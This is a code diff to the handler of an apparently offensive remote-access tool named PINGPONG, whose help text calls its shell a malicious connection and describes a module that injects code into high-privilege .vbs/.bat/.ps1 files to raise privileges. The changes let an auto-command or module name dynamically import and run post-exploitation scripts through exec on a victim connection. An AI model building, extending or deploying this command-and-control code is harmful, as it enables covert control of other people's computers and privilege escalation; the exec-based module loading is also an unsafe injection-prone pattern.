@@ -56,7 +56,7 @@ def startserver(printf, ip='127.0.0.1', port='624', is_input=False, is_auto=True
 		try:
 			s.bind((ip, port))
 			s.listen(10)
-		except socket.error as msg:
+		except Exception as msg:
 			main.print_error(f"handler>[-]{msg}")
 			main.print_error("handler>[-]Failed to bind on " + ip + ":" + str(port))
 			main.print_normal(f"handler>[*]Bind on {listen_Default_ip}:{listen_Default_port}")
@@ -194,7 +194,7 @@ PINGPONG>[*]the PINGPONG shell is a malicious connection and it will start when 
 			priv:
 				priv_vbp_listen : when a high-priv file(.vbs .bat .psl) is created, inject code which can make your priv higher""")
 
-	def ask_for_choice(list=False, print_out=True):
+	def ask_for_choice(list=False, print_out=True, command=''):
 		if PINGPONG_script.addsend.App_send("SHOW_ALL_USAGE_APP", False, conn, addr, my_addr):
 			all_mod_usage_dict = {}
 			mods = []
@@ -205,7 +205,7 @@ PINGPONG>[*]the PINGPONG shell is a malicious connection and it will start when 
 					scripts = []
 					for scr in os.listdir(f'./PINGPONG_script/{mod}'):
 						usage = os.path.splitext(scr)[0]
-						if scr != 'TEMP' and scr != 'SOURCE_FILE':
+						if scr != 'TEMP' and scr != 'SOURCE_FILE' and scr != '__pycache__':
 							scripts.append(usage)
 					all_mod_usage_dict[mod] = scripts
 			conn.send(b'OK')
@@ -240,9 +240,20 @@ PINGPONG>[*]the PINGPONG shell is a malicious connection and it will start when 
 					main.print_good('	33) background')
 					main.print_good('   	66) help')
 					main.print_good('   	99) exit')
-				mod_choice = input('PINGPONG>')
+				if command == '':
+					mod_choice = input('PINGPONG>')
+				else:
+					mod_choice = command
 				def load_mod(_mod_choice, conn, addr, my_addr):
 					if not _mod_choice in mod_id_dst.keys():
+						if mod_choice in usage_list:
+							for j in all_mod_usage_dict.keys():
+								modle = all_mod_usage_dict[j]
+								for i in modle:
+									if mod_choice == i:
+										exec(f'import PINGPONG_script.{j}.{i}')
+										exec(f'PINGPONG_script.{j}.{i}.run(conn, addr, my_addr)')
+										return True
 						main.print_error('PINGPONG>[-]No such choice')
 						return False
 					modl = mod_id_dst[_mod_choice]
@@ -277,7 +288,7 @@ PINGPONG>[*]the PINGPONG shell is a malicious connection and it will start when 
 	while True:
 		if Autocommand and g_is_auto and Autocommand != '' and Autocommand != ' ':
 			main.print_normal("PINGPONG>[*]running " + Autocommand)
-			command = Autocommand
+			ask_for_choice(command=Autocommand)
 			Autocommand = False
 		else:
 			ask_for_choice()               
